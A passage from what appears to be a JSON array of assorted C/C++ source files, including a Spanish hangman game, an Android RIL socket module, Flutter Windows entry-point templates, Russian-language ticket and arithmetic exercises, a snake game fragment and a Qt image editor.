5);\n\t\tcout << \"Enter your origin of air travel : \";\n\t\tcin >> origin;\n\t\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 6);\n\t\tcout << \"Enter your destination of air travel : \";\n\t\tcin >> desti;\n\t\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 12);\n\t\tcout << \"Enter your Date of air travel\" << endl;\n\t\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 8);\n\t\tcout << \"Enter day of your travel : \";\n\t\tcin >> day;\n\t\tcout << \"Enter month of your travel : \";\n\t\tcin >> month;\n\t\tcout << \"Enter year of your travel : \";\n\t\tcin >> year;\n\t\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 10);\n\t\tcout << \"Enter your transit location : \";\n\t\tcin >> transit;\n\t\tDate s3_d(day, month, year);\n\t\tinitializer in;\n\t\tin.origin = origin;\n\t\tin.destination = desti;\n\t\tin.transit = transit;\n\t\tin.d = s3_d;\n\t\tinitiate(in, input);\n\t}\n\telse if (inpu",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <conio.h>\n#include <time.h>\n\n\n int random_number(int min_num, int max_num)\n    {\n        int result = 0, low_num = 0, hi_num = 0;\n\n        if (min_num < max_num)\n        {\n            low_num = min_num;\n            hi_num = max_num + 1; // include max_num in output\n        } else {\n            low_num = max_num + 1; // include max_num in output\n            hi_num = min_num;\n        }\n\n        srand(time(NULL));\n        result = (rand() % (hi_num - low_num)) + low_num;\n        return result;\n    }\n\nint random ( int n )\n{\nreturn ((unsigned long)rand()*n) >> 15;\n}\n\n \nvoid escribe(int color,int x, int y)\n\n{\n\n            gotoxy(x,y);\n\n            textcolor(color);\n\n//          printf(\"%s\",cadena);\n\n \n\n}\n \n\nint main()\n\n{\n\n        \n\n char matriz[10][20]={\"helicoptero\",\"naranja\",\"helice\",\"jardinero\",\"electricista\",\"calendario\",\"taladro\",\"cometa\",\"saltamontes\",\"antena\"};\n\n int plantilla[1][20],abc=0,x=37,y=21;\n\n char abecedario[34];\n\n int palabra,numpalabras=10,adivina,fallos,longpalabra,longadivina,salir;\n\n char repetir='s';\n\n int acierto; //Variable booleana: 1 significa que acert\u00a2 una\n\n                                                            // o m s letras, 0 que no\n\n int i,j;\n\n char letra[1];\n\n \n\n \n\n //////// PRESENTACION MENU PRINCIPAL\n\n ///////////////////////////////////////\n\n \n\n clrscr();\n\n printf(\"\\n\\t=======================================\");\n\n printf(\"\\n\\t           JUEGO DEL AHORCADO\");\n\n printf(\"\\n\\t=======================================\");\n\n printf(\"\");\n\n printf(\"\\n\\tInstrucciones: El ordenador pensar  una palabra y t\u00a3 tienes 10\");\n\n printf(\"\\n\\tintentos para acertarla. En cada intento podr s elegir una letra.\");\n\n printf(\"\\n\\tSi la palabra a adivinar la contiene, aparecer  en su corres-\");\n\n printf(\"\\n\\tpondiente posici\u00a2n. Sino, tendr s un intento menos.Hasta agotar\");\n\n printf(\"\\n\\tlos 10. \u00ad\u00ad\u00ad\u00adBUENA SUERTE!!!\");\n\n printf(\"\\n\\n\");\n\n printf(\"\\nPulsa una tecla para empezar...\");\n\n getch();\n\n             //Busca una palabra aleatoriamente\n\n  do\n\n  {\n\n             clrscr();\n\n             srand(time(0));\n\n             acierto=0;\n\n             fallos=0;\n\n             longpalabra=0;\n\n             longadivina=0;\n\n             salir=0;\n\n             adivina=random_number(0,9) ;//random(numpalabras-1)+1;\n             \n     printf(\"Min : 1 Max : 40 %d\\n     %s\", adivina,matriz[adivina]);\n             \n getch();\n             \n\n             for (i=0;matriz[adivina][i]!='\\0';i++)\n\n             {\n\n                        plantilla[1][i]=0;\n\n                        longpalabra++;\n\n             }\n\n             plantilla[1][i]='\\0';\n\n//          gotoxy(12,13);\n\n             escribe(15,12,13);\n\n             cprintf(\"Palabra a adivinar: \");\n\n \n\n             //Presentamos la linea inicial punteada con tantos espacios como letras\n\n             for (i=0;matriz[adivina][i]!='\\0';i++)\n\n             {\n\n                        printf(\" _ \");\n\n \n\n             }\n\n                        do\n\n                        {\n\n                                   //gotoxy(10,15);\n\n                                   escribe(15,10,15);\n\n                                   cprintf(\"1   Introduce una letra: \"); scanf(\"%s\",&letra);\n\n                                   //gotoxy(12,13);\n\n                                   escribe(15,12,13);\n\n                                   cprintf(\"2   Palabra a adivinar: \");\n\n                                   for (i=0;matriz[adivina][i]!='\\0';i++)\n\n                                   {\n\n\n\n\n                                               if (matriz[adivina][i]==letra[0])\n\n                                               {\n\n                                                           plantilla[1][i]=1;\n\n                                                           printf(\" %c \",matriz[adivina][i]);\n\n                                                           acierto=1;\n\n                                               }\n\n                                               else\n\n                                               {\n\n                                                           if (plantilla[1][i]==1)\n\n                                                           {\n\n                                                                       printf(\" %c \",matriz[adivina][i]);\n\n                                                           }\n\n                                                           else\n\n                                                           {\n\n                                                                       printf(\" + \");\n\n                                                           }\n\n                                               }\n\n                                   }\n\n                                   //gotoxy(21,21);\n\n                                   escribe(15,21,21);\n\n                                   cprintf(\"Letras cogidas: \");\n\n                                   abecedario[abc]=letra[0];\n\n                                   x++;\n\n               ",
    "/*\n* Copyright (C) 2014 The Android Open Source Project\n*\n* Licensed under the Apache License, Version 2.0 (the \"License\");\n* you may not use this file except in compliance with the License.\n* You may obtain a copy of the License at\n*\n*     http://www.apache.org/licenses/LICENSE-2.0\n*\n* Unless required by applicable law or agreed to in writing, software\n* distributed under the License is distributed on an \"AS IS\" BASIS,\n* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n* See the License for the specific language governing permissions and\n* limitations under the License.\n*/\n\n#include <stdint.h>\n#define RIL_SHLIB\n#include \"telephony/ril.h\"\n#include \"RilSapSocket.h\"\n#include \"pb_decode.h\"\n#include \"pb_encode.h\"\n#undef LOG_TAG\n#define LOG_TAG \"RIL_UIM_SOCKET\"\n#include <utils/Log.h>\n#include <arpa/inet.h>\n#include <errno.h>\n#include <sap_service.h>\n\nstatic RilSapSocket::RilSapSocketList *head = NULL;\n\nextern \"C\" void\nRIL_requestTimedCallback (RIL_TimedCallback callback, void *param,\n        const struct timeval *relativeTime);\n\nstruct RIL_Env RilSapSocket::uimRilEnv = {\n        .OnRequestComplete = RilSapSocket::sOnRequestComplete,\n        .OnUnsolicitedResponse = RilSapSocket::sOnUnsolicitedResponse,\n        .RequestTimedCallback = RIL_requestTimedCallback\n};\n\nvoid RilSapSocket::sOnRequestComplete (RIL_Token t,\n        RIL_Errno e,\n        void *response,\n        size_t responselen) {\n    RilSapSocket *sap_socket;\n    SapSocketRequest *request = (SapSocketRequest*) t;\n\n    RLOGD(\"Socket id:%d\", request->socketId);\n\n    sap_socket = getSocketById(request->socketId);\n\n    if (sap_socket) {\n        sap_socket->onRequestComplete(t,e,response,responselen);\n    } else {\n        RLOGE(\"Invalid socket id\");\n        if (request->curr) {\n            free(request->curr);\n        }\n        free(request);\n    }\n}\n\n#if defined(ANDROID_MULTI_SIM)\nvoid RilSapSocket::sOnUnsolicitedResponse(int unsolResponse,\n        const void *data,\n        size_t datalen,\n        RIL_SOCKET_ID socketId) {\n    RilSapSocket *sap_socket = getSocketById(socketId);\n    if (sap_socket) {\n        sap_socket->onUnsolicitedResponse(unsolResponse, (void *)data, datalen);\n    }\n}\n#else\nvoid RilSapSocket::sOnUnsolicitedResponse(int unsolResponse,\n       const void *data,\n       size_t datalen) {\n    RilSapSocket *sap_socket = getSocketById(RIL_SOCKET_1);\n    if(sap_socket){\n        sap_socket->onUnsolicitedResponse(unsolResponse, (void *)data, datalen);\n    }\n}\n#endif\n\nvoid RilSapSocket::printList() {\n    RilSapSocketList *current = head;\n    RLOGD(\"Printing socket list\");\n    while(NULL != current) {\n        RLOGD(\"SocketName:%s\",current->socket->name);\n        RLOGD(\"Socket id:%d\",current->socket->id);\n        current = current->next;\n    }\n}\n\nRilSapSocket *RilSapSocket::getSocketById(RIL_SOCKET_ID socketId) {\n    RilSapSocket *sap_socket;\n    RilSapSocketList *current = head;\n\n    RLOGD(\"Entered getSocketById\");\n    printList();\n\n    while(NULL != current) {\n        if(socketId == current->socket->id) {\n            sap_socket = current->socket;\n            return sap_socket;\n        }\n        current = current->next;\n    }\n    return NULL;\n}\n\nvoid RilSapSocket::initSapSocket(const char *socketName,\n        const RIL_RadioFunctions *uimFuncs) {\n\n    if (strcmp(socketName, RIL1_SERVICE_NAME) == 0) {\n        if(!SocketExists(socketName)) {\n            addSocketToList(socketName, RIL_SOCKET_1, uimFuncs);\n        }\n    }\n\n#if (SIM_COUNT >= 2)\n    if (strcmp(socketName, RIL2_SERVICE_NAME) == 0) {\n        if(!SocketExists(socketName)) {\n            addSocketToList(socketName, RIL_SOCKET_2, uimFuncs);\n        }\n    }\n#endif\n\n#if (SIM_COUNT >= 3)\n    if (strcmp(socketName, RIL3_SERVICE_NAME) == 0) {\n        if(!SocketExists(socketName)) {\n            addSocketToList(socketName, RIL_SOCKET_3, uimFuncs);\n        }\n    }\n#endif\n\n#if (SIM_COUNT >= 4)\n    if (strcmp(socketName, RIL4_SERVICE_NAME) == 0) {\n        if(!SocketExists(socketName)) {\n            addSocketToList(socketName, RIL_SOCKET_4, uimFuncs);\n        }\n    }\n#endif\n}\n\nvoid RilSapSocket::addSocketToList(const char *socketName, RIL_SOCKET_ID socketid,\n        const RIL_RadioFunctions *uimFuncs) {\n    RilSapSocket* socket = NULL;\n    RilSapSocketList *current;\n\n    if(!SocketExists(socketName)) {\n        socket = new RilSapSocket(socketName, socketid, uimFuncs);\n        RilSapSocketList* listItem = (RilSapSocketList*)malloc(sizeof(RilSapSocketList));\n        if (!listItem) {\n            RLOGE(\"addSocketToList: OOM\");\n            delete socket;\n            return;\n        }\n        listItem->socket = socket;\n        listItem->next = NULL;\n\n        RLOGD(\"Adding socket with id: %d\", socket->id);\n\n        if(NULL == head) {\n            head = listItem;\n            head->next = NULL;\n        }\n        else {\n            current = head;\n            while(NULL != current->next) {\n                current = current->next;\n            }\n            current->next = listItem;\n        }\n   ",
    "#include <iostream>\n\nint main() {\n    int a = 5;\n    int b = 10;\n    int c = 15;\n    int d = 20;\n    int e = 25;\n\n    std::cout << \"Arifmeticheskie operacii:\" << std::endl;\n\n    std::cout << (a + b == 15) << \" (5 + 10 == 15)\" << std::endl; // true\n    std::cout << (c - b == 5) << \" (15 - 10 == 5)\" << std::endl; // true\n    std::cout << (d - a == 15) << \" (20 - 5 == 15)\" << std::endl; // true\n\n    std::cout << (a * 2 == 10) << \" (5 * 2 == 10)\" << std::endl; // true\n    std::cout << (b * 1 == 10) << \" (10 * 1 == 10)\" << std::endl; // true\n    std::cout << (c / 3 == 5) << \" (15 / 3 == 5)\" << std::endl; // true\n\n    std::cout << (d / 2 == 10) << \" (20 / 2 == 10)\" << std::endl; // true\n    std::cout << (e / 5 == 5) << \" (25 / 5 == 5)\" << std::endl; // true\n    std::cout << (c / 1 == 15) << \" (15 / 1 == 15)\" << std::endl; // true\n\n    std::cout << (d % 3 == 2) << \" (20 % 3 == 2)\" << std::endl; // true\n    std::cout << (e % 6 == 1) << \" (25 % 6 == 1)\" << std::endl; // true\n    std::cout << (b % 2 == 0) << \" (10 % 2 == 0)\" << std::endl; // true\n\n    std::cout << \"\\nLogicheskie operacii:\" << std::endl;\n\n    std::cout << ((a < b) && (b < c)) << \" ((5 < 10) && (10 < 15))\" << std::endl; // true\n    std::cout << ((e > d) && (d > c)) << \" ((25 > 20) && (20 > 15))\" << std::endl; // true\n    std::cout << ((a + b == 15) && (c - d == -5)) << \" ((5 + 10 == 15) && (15 - 20 == -5))\" << std::endl; // true\n\n    std::cout << ((a < c) || (b > e)) << \" ((5 < 15) || (10 > 25))\" << std::endl; // true\n    std::cout << ((d < e) || (c < b)) << \" ((20 < 25) || (15 < 10))\" << std::endl; // true\n    std::cout << ((c == 15) || (a == 10)) << \" ((15 == 15) || (5 == 10))\" << std::endl; // true\n\n    std::cout << (!((a == 10))) << \" (!(5 == 10))\" << std::endl; // true\n    std::cout << (!((b == 10))) << \" (!(10 == 10))\" << std::endl; // true\n    std::cout << (!((e < d))) << \" (!(25 < 20))\" << std::endl; // true\n\n    std::cout << \"\\nOperaciya sravneniya:\" << std::endl;\n\n    std::cout << (a == 5) << \" (5 == 5)\" << std::endl; // true\n    std::cout << (b == 10) << \" (10 == 10)\" << std::endl; // true\n    std::cout << (c == 15) << \" (15 == 15)\" << std::endl; // true\n\n    std::cout << (d != 15) << \" (20 != 15)\" << std::endl; // true\n    std::cout << (e != 10) << \" (25 != 10)\" << std::endl; // true\n    std::cout << (a != 1) << \" (5 != 1)\" << std::endl; // true\n\n    std::cout << (a < b) << \" (5 < 10)\" << std::endl; // true\n    std::cout << (d > c) << \" (20 > 15)\" << std::endl; // true\n    std::cout << (e > b) << \" (25 > 10)\" << std::endl; // true\n\n    std::cout << (a <= 5) << \" (5 <= 5)\" << std::endl; // true\n    std::cout << (b >= 10) << \" (10 >= 10)\" << std::endl; // true\n    std::cout << (c <= 15) << \" (15 <= 15)\" << std::endl; // true\n\n    // Logicheskoe ILI (OR)\n    std::cout << ((a < c) || (b > e)) << \" ((5 < 15) || (10 > 25))\" << std::endl; // true\n    std::cout << ((d < e) || (a == c)) << \" ((20 < 25) || (5 == 15))\" << std::endl; // true\n    std::cout << ((b > a) || (c < d)) << \" ((10 > 5) || (15 < 20))\" << std::endl; // true\n\n    // Logicheskoe NOT\n    std::cout << (!(a > b)) << \" (!(5 > 10))\" << std::endl; // true\n    std::cout << (!(c == d)) << \" (!(15 == 20))\" << std::endl; // true\n    std::cout << (!(e < d)) << \" (!(25 < 20))\" << std::endl; // true\n\n    // Sravneniya\n    std::cout << \"\\nSravneniya:\" << std::endl;\n\n    std::cout << (a == 5) << \" (5 == 5)\" << std::endl; // true\n    std::cout << (b != 20) << \" (10 != 20)\" << std::endl; // true\n    std::cout << (c <= 15) << \" (15 <= 15)\" << std::endl; // true\n    std::cout << (d >= 20) << \" (20 >= 20)\" << std::endl; // true\n\n    // Smeshanie operatsii\n    std::cout << \"\\nSmeshanie operatsii:\" << std::endl;\n\n    std::cout << (((a + b) == 15) && (d > c)) << \" (((5 + 10) == 15) && (20 > 15))\" << std::endl; // true\n    std::cout << (((c / 5) * 3) == 9) << \" (((15 / 5) * 3) == 9)\" << std::endl; // true\n    std::cout << ((e - a + b) >= 20) << \" ((25 - 5 + 10) >= 20)\" << std::endl; // true\n\n    // Uvelicheniye i umenshenie\n    std::cout << \"\\nUvelicheniye i umenshenie:\" << std::endl;\n\n    a++;\n    std::cout << (a == 6) << \" (a++ dolzhno byt 6)\" << std::endl; // true\n    b--;\n    std::cout << (b == 9) << \" (b-- dolzhno byt 9)\" << std::endl; // true\n\n    // Ispolzuyushchye druie peremennye\n    int f = 30;\n    int g = 10;\n\n    std::cout << \"\\nIspolzuyushchye druie peremennye:\" << std::endl;\n    std::cout << (f / g == 3) << \" (30 / 10 == 3)\" << std::endl; // true\n    std::cout << (f % g == 0) << \" (30 % 10 == 0)\";\n\n    return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"crud_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <string>\n\nusing namespace std;\n  \nclass Station {\nprivate:\n    string station_name;\n    double ticket_price;\n    int total_seats;\n    int sold_tickets;\n\npublic:\n\n    Station(const string& name, double price, int seats)\n        : station_name(name), ticket_price(price), total_seats(seats), sold_tickets(0) {}\n\n    void setSoldTickets(int sold) {\n        if (sold <= total_seats) {\n            sold_tickets = sold;\n        }\n        else {\n            cerr << \"\u00ce\u00f8\u00e8\u00e1\u00ea\u00e0: \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00ef\u00f0\u00ee\u00e4\u00e0\u00ed\u00ed\u00fb\u00f5 \u00e1\u00e8\u00eb\u00e5\u00f2\u00ee\u00e2 \u00ed\u00e5 \u00ec\u00ee\u00e6\u00e5\u00f2 \u00ef\u00f0\u00e5\u00e2\u00fb\u00f8\u00e0\u00f2\u00fc \u00ee\u00e1\u00f9\u00e5\u00e5 \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00ec\u00e5\u00f1\u00f2.\" << endl;\n        }\n    }\n\n    double calculateUnsoldTicket() const {\n        int unsold_tickets = total_seats - sold_tickets;\n        return unsold_tickets * ticket_price;\n    }\n\n    void displayInfo() const {\n        cout << \"\u00d1\u00f2\u00e0\u00ed\u00f6\u00e8\u00ff: \" << station_name << endl;\n        cout << \"\u00d1\u00f2\u00ee\u00e8\u00ec\u00ee\u00f1\u00f2\u00fc \u00e1\u00e8\u00eb\u00e5\u00f2\u00e0: \" << ticket_price << endl;\n        cout << \"\u00c2\u00f1\u00e5\u00e3\u00ee \u00ec\u00e5\u00f1\u00f2: \" << total_seats << endl;\n        cout << \"\u00cf\u00f0\u00ee\u00e4\u00e0\u00ed\u00ee \u00e1\u00e8\u00eb\u00e5\u00f2\u00ee\u00e2: \" << sold_tickets << endl;\n        cout << \"\u00cd\u00e5\u00ef\u00f0\u00ee\u00e4\u00e0\u00ed\u00ed\u00fb\u00e5 \u00e1\u00e8\u00eb\u00e5\u00f2\u00fb: \" << (total_seats - sold_tickets) << endl;\n        cout << \"\u00ce\u00e1\u00f9\u00e0\u00ff \u00f1\u00f2\u00ee\u00e8\u00ec\u00ee\u00f1\u00f2\u00fc \u00ed\u00e5\u00ef\u00f0\u00ee\u00e4\u00e0\u00ed\u00ed\u00fb\u00f5 \u00e1\u00e8\u00eb\u00e5\u00f2\u00ee\u00e2: \" << calculateUnsoldTicket() << endl;\n    }\n};\n\nint main() {\n    setlocale(LC_ALL, \"Russian\");\n\n    string station_name;\n    double ticket_price;\n    int total_seats;\n\n    cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00ed\u00e0\u00e7\u00e2\u00e0\u00ed\u00e8\u00e5 \u00f1\u00f2\u00e0\u00ed\u00f6\u00e8\u00e8: \";\n    getline(cin, station_name);\n\n    do {\n        cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00f1\u00f2\u00ee\u00e8\u00ec\u00ee\u00f1\u00f2\u00fc \u00e1\u00e8\u00eb\u00e5\u00f2\u00e0: \";\n        cin >> ticket_price;\n\n        if (ticket_price < 0) {\n            cout << \"\u00ce\u00f8\u00e8\u00e1\u00ea\u00e0: \u00f1\u00f2\u00ee\u00e8\u00ec\u00ee\u00f1\u00f2\u00fc \u00e1\u00e8\u00eb\u00e5\u00f2\u00e0 \u00ed\u00e5 \u00ec\u00ee\u00e6\u00e5\u00f2 \u00e1\u00fb\u00f2\u00fc \u00ee\u00f2\u00f0\u00e8\u00f6\u00e0\u00f2\u00e5\u00eb\u00fc\u00ed\u00ee\u00e9. \u00cf\u00ee\u00ef\u00f0\u00ee\u00e1\u00f3\u00e9\u00f2\u00e5 \u00f1\u00ed\u00ee\u00e2\u00e0.\" << endl;\n        }\n    } while (ticket_price < 0); \n\n    do {\n        cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00ee\u00e1\u00f9\u00e5\u00e5 \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00ec\u00e5\u00f1\u00f2: \";\n        cin >> total_seats;\n\n        if (total_seats < 0) {\n            cout << \"\u00ce\u00f8\u00e8\u00e1\u00ea\u00e0: \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00ec\u00e5\u00f1\u00f2 \u00ed\u00e5 \u00ec\u00ee\u00e6\u00e5\u00f2 \u00e1\u00fb\u00f2\u00fc \u00ee\u00f2\u00f0\u00e8\u00f6\u00e0\u00f2\u00e5\u00eb\u00fc\u00ed\u00fb\u00ec. \u00cf\u00ee\u00ef\u00f0\u00ee\u00e1\u00f3\u00e9\u00f2\u00e5 \u00f1\u00ed\u00ee\u00e2\u00e0.\" << endl;\n        }\n    } while (total_seats < 0);\n\n    Station station(station_name, ticket_price, total_seats);\n\n    int sold_tickets;\n    do {\n        cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00ef\u00f0\u00ee\u00e4\u00e0\u00ed\u00ed\u00fb\u00f5 \u00e1\u00e8\u00eb\u00e5\u00f2\u00ee\u00e2: \";\n        cin >> sold_tickets;\n\n        if (sold_tickets < 0) {\n            cout << \"\u00ce\u00f8\u00e8\u00e1\u00ea\u00e0: \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00ef\u00f0\u00ee\u00e4\u00e0\u00ed\u00ed\u00fb\u00f5 \u00e1\u00e8\u00eb\u00e5\u00f2\u00ee\u00e2 \u00ed\u00e5 \u00ec\u00ee\u00e6\u00e5\u00f2 \u00e1\u00fb\u00f2\u00fc \u00ee\u00f2\u00f0\u00e8\u00f6\u00e0\u00f2\u00e5\u00eb\u00fc\u00ed\u00fb\u00ec. \u00cf\u00ee\u00ef\u00f0\u00ee\u00e1\u00f3\u00e9\u00f2\u00e5 \u00f1\u00ed\u00ee\u00e2\u00e0.\" << endl;\n        }\n        else if (sold_tickets > total_seats) {\n            cout << \"\u00ce\u00f8\u00e8\u00e1\u00ea\u00e0: \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00ef\u00f0\u00ee\u00e4\u00e0\u00ed\u00ed\u00fb\u00f5 \u00e1\u00e8\u00eb\u00e5\u00f2\u00ee\u00e2 \u00ed\u00e5 \u00ec\u00ee\u00e6\u00e5\u00f2 \u00ef\u00f0\u00e5\u00e2\u00fb\u00f8\u00e0\u00f2\u00fc \u00ee\u00e1\u00f9\u00e5\u00e5 \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00ec\u00e5\u00f1\u00f2. \u00cf\u00ee\u00ef\u00f0\u00ee\u00e1\u00f3\u00e9\u00f2\u00e5 \u00f1\u00ed\u00ee\u00e2\u00e0.\" << endl;\n        }\n    } while (sold_tickets < 0 || sold_tickets > total_seats);\n\n    station.setSoldTickets(sold_tickets);\n\n    station.displayInfo();\n\n    return 0;\n}",
    "        tailX[i] = prevX; \n        tailY[i] = prevY; \n        prevX = prev2X; \n        prevY = prev2Y; \n    } \n    switch (dir) { \n    case LEFT: \n        x--; \n        break; \n    case RIGHT: \n        x++; \n        break; \n    case UP: \n        y--; \n        break; \n    case DOWN: \n        y++; \n        break; \n    default: \n        break; \n    } \n \n    if (x >= width) x = 0; else if (x < 0) x = width - 1; \n    if (y >= height) y = 0; else if (y < 0) y = height - 1; \n \n    for (int i = 0; i < nTail; i++) \n        if (tailX[i] == x && tailY[i] == y) \n            gameOver = true; \n \n    if (x == fruitX && y == fruitY) { \n        score += 10; \n        fruitX = rand() % width; \n        fruitY = rand() % height; \n        nTail++; \n    } \n} \n \nvoid playSnakeGame() { \n    setup(); \n    while (!gameOver) { \n        draw(); \n        input(); \n        logic(); \n        Sleep(100); \n    } \n    cout << \"Game Over! Your final score: \" << score << endl; \n} \n \n// Main application \nint main() { \n    Cart cart; ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"web_view_flutter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"mainwindow.h\"\r\n#include \"ui_mainwindow.h\"\r\n\r\nMainWindow::MainWindow(QWidget *parent) // \u041a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\r\n    : QMainWindow(parent)\r\n    , ui(new Ui::MainWindow)\r\n{\r\n    ui->setupUi(this);\r\n    flickButtons(false);\r\n    this->setFocusPolicy(Qt::StrongFocus);\r\n    setWindowTitle(\"Lightroom v2\");\r\n    initializeSliders();\r\n}\r\n\r\nMainWindow::~MainWindow() // \u0414\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\r\n{\r\n    if (canv!=nullptr) delete canv;\r\n    delete ui;\r\n}\r\n\r\nvoid MainWindow::on_pbOpen_clicked() // \u041e\u0442\u043a\u0440\u044b\u0442\u0438\u0435 \u043a\u0430\u0440\u0442\u0438\u043d\u043a\u0438\r\n{\r\n    QString ret = QFileDialog::getOpenFileName(this,\"Open image\",\"\",\"*.png *.jpg\");\r\n    if (ret==\"\")return;\r\n\r\n    mainImage.load(ret);\r\n    copyImage = mainImage.copy();\r\n    initialW = mainImage.width();\r\n    initialH = mainImage.height();\r\n\r\n    createCanvas();\r\n    initializeSliders();\r\n\r\n    connect(ui->SlidExp, SIGNAL(valueChanged(int)), canv, SLOT(EXChange(int)));\r\n    connect(ui->SlidHl, SIGNAL(valueChanged(int)), canv, SLOT(HLChange(int)));\r\n    connect(ui->SlidSh, SIGNAL(valueChanged(int)), canv, SLOT(SHChange(int)));\r\n    connect(ui->SlidTp, SIGNAL(valueChanged(int)), canv, SLOT(CBChange(int)));\r\n    connect(ui->SlidTi, SIGNAL(valueChanged(int)), canv, SLOT(TIChange(int)));\r\n    connect(ui->SlidBl, SIGNAL(valueChanged(int)), canv, SLOT(COChange(int)));\r\n\r\n    flickButtons(true);\r\n}\r\n\r\nvoid MainWindow::on_pbZoomIn_clicked() // \u041f\u0440\u0438\u0431\u043b\u0438\u0437\u0438\u0442\u044c\r\n{\r\n    coef = coef*1.25;\r\n    mainImage = copyImage.scaled(int(initialW*coef),int(initialH*coef),Qt::KeepAspectRatio,Qt::SmoothTransformation);\r\n    canv->drawCanv();\r\n}\r\n\r\nvoid MainWindow::on_pbZoomOut_clicked() // \u041e\u0442\u0434\u0430\u043b\u0438\u0442\u044c\r\n{\r\n    coef = coef/1.25;\r\n    mainImage = copyImage.scaled(int(initialW*coef),int(initialH*coef),Qt::KeepAspectRatio,Qt::SmoothTransformation);\r\n    canv->drawCanv();\r\n}\r\n\r\nvoid MainWindow::keyPressEvent(QKeyEvent *e) // 